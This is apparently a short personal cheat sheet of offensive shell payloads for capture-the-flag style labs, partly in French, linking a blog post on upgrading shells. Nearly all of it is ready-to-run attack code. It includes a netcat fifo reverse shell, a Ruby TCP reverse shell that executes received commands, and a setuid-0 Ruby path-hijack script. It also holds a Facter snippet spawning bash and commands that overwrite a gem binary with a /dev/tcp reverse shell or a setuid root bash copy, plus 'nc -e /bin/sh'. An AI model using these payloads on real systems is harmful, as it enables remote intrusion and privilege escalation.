# [Shell Upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

# Reverse Shell fifo
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.158 4444 >/tmp/f
```
# Ruby
```ruby
# Reverse shell
require 'socket'
require 'open3'

s = TCPSocket.new("10.10.14.197", 1337)
while cmd = s.gets
  stdout, stderr, _ = Open3.capture3(cmd.chomp)
  s.puts(stdout + stderr)
end

# Path hijacking
#!/usr/bin/env ruby
Process::Sys.setuid(0)
exec "/bin/bash -p"

# Force /bin/bash à l'ouverture du fichier
'EOF'
Facter.add('shell') do
	setcode do
		system('/bin/bash')
	end
end
EOF
```

# Bash
```bash
# Reverse shell
echo '#!/bin/bash' > /opt/.local/share/gem/bin/thor
echo 'bash -i >& /dev/tcp/10.10.14.197/4444 0>&1' >> /opt/.local/share/gem/bin/thor
chmod +x /opt/.local/share/gem/bin/thor

# PE
echo '#!/bin/bash' > /opt/.local/share/gem/bin/thor
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/.local/share/gem/bin/thor
chmod +x /opt/.local/share/gem/bin/thor

# Avec netcat directement
nc 10.10.14.197 4444 -e /bin/sh
```
